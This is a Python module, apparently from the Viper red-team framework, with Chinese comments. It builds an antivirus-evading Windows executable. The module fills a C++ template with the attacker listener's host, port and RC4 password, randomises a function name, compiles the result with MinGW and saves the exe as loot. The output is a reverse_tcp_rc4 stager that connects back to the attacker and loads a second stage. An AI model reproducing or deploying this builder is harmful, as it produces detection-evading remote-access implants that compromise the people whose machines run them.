# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


import time

from Lib.ModuleAPI import *


class PostModule(PostPythonModule):
    NAME = "Reverse_TCP_RC4直连免杀"
    DESC = "模块采用直连监听,读取stager2的方式进行免杀"
    MODULETYPE = TAG2CH.Execution
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = []  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/wh4gbm"]
    REFERENCES = [""]
    AUTHOR = "Viper"

    OPTIONS = register_options([
        OptionHander(),
        # OptionStr("LHOST", name_tag="LHOST", desc="填写监听中LHOST字段", required=True),
        # OptionIntger("LPORT", name_tag="LPORT", desc="填写监听中LPORT字段", required=True),
        # OptionStr("PASSWORD", name_tag="PASSWORD", desc="填写监听中RC4密码", required=True),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        payload = self.get_handler_payload()
        if "windows" not in payload:
            return False, "模块只支持windows类型载荷"
        if "reverse_tcp_rc4" not in payload:
            return False, "模块只支持reverse_tcp_rc4载荷"
        return True, None

    def run(self):
        handler_config = self.get_handler_config()
        LHOST = handler_config.get("LHOST")
        LPORT = handler_config.get("LPORT")
        PASSWORD = handler_config.get("RC4PASSWORD")
        FUNCTION = self.random_str(10)
        source_code = self.generate_context_by_template(filename="main.cpp", LHOST=LHOST, LPORT=LPORT,
                                                        PASSWORD=PASSWORD, FUNCTION=FUNCTION)
        mingw = Mingw(include_dir=self.module_data_dir, source_code=source_code)
        payload = self.get_handler_payload()
        if "x64" not in payload:
            arch = "x86"
        else:
            arch = "x64"
        binbytes = mingw.compile(arch=arch, extra_params=["-lws2_32", "-lwininet"])
        filename = f"Reverse_TCP_RC4_{int(time.time())}.exe"
        self.write_to_loot(filename=filename, data=binbytes)
        self.log_good("模块执行成功")
        self.log_good(f"请在<文件列表>中查看生成的exe文件: {filename}")
